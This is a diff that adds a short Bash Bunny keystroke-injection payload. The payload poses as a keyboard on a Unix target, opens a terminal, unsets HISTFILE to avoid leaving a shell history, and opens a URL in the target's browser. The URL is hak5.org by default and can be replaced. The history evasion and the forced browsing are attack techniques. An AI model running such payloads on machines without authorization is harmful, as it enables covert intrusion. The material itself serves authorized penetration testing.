@@ -1,0 +1,29 @@
+# Title: BROWSER_EXEC_DEMO
+# Description: This payload demonstrates functioning of extension BROWSER_EXEC which finds browsers installed in target's system and searches URL in it.
+# AUTHOR: drapl0n
+# Version: 1.0
+# Category: Execution.
+# Target: Unix-like operating systems.
+# Attackmodes: HID
+
+# [Setting up Bunny]
+LED SETUP
+ATTACKMODE HID
+
+# [Launching Terminal Emulator]
+LED ATTACK
+Q DELAY 1000
+Q CTRL-ALT t
+Q DELAY 1000
+
+# [Prevent storing history]
+Q STRING unset HISTFILE
+Q ENTER
+Q DELAY 200
+
+# [Executing Main Payload]
+
+# [Note: Replace URL below to the URL which you want your target system to visit.]
+BROWSER_EXEC hak5.org
+
+LED FINISH
